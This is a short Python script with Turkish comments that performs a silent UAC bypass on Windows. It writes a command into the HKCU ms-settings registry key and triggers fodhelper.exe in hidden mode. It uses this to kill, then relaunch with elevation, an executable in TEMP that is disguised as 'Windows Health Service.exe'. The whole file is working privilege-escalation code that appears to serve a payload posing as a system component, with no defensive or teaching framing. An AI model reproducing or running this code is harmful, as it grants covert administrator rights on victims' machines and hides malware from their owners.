import os
import winreg
import time
import ctypes
import sys

# Ayar: Görev yöneticisindeki tam isim
target_process_name = "Windows Health Service.exe"

def run_completely_invisible(cmd_path, params=""):
    """Windows API kullanarak komutu tamamen gizli (SW_HIDE) başlatır."""
    # SW_HIDE = 0 (Pencereyi gizle)
    ctypes.windll.shell32.ShellExecuteW(None, "open", cmd_path, params, None, 0)

def uac_bypass_action(target_to_run):
    """fodhelper üzerinden sessizce UAC bypass yapar."""
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    try:
        # 1. Kayıt defterini hazırla
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, target_to_run)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 2. fodhelper.exe'yi GUI olmadan ve gizli modda tetikle
        run_completely_invisible("fodhelper.exe")
        
        # İşlem süresi ve temizlik
        time.sleep(4)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    except:
        pass

if __name__ == "__main__":
    # --- 1. ADIM: ESKİSİNİ GİZLİCE KAPAT ---
    # taskkill komutunu doğrudan tırnak içinde gönderiyoruz
    kill_params = f'/F /IM "{target_process_name}" /T'
    uac_bypass_action(f'taskkill {kill_params}')

    # --- 2. ADIM: YENİSİNİ GİZLİCE AÇ ---
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, target_process_name)

    if os.path.exists(full_path):
        uac_bypass_action(f'"{full_path}"')

    sys.exit()
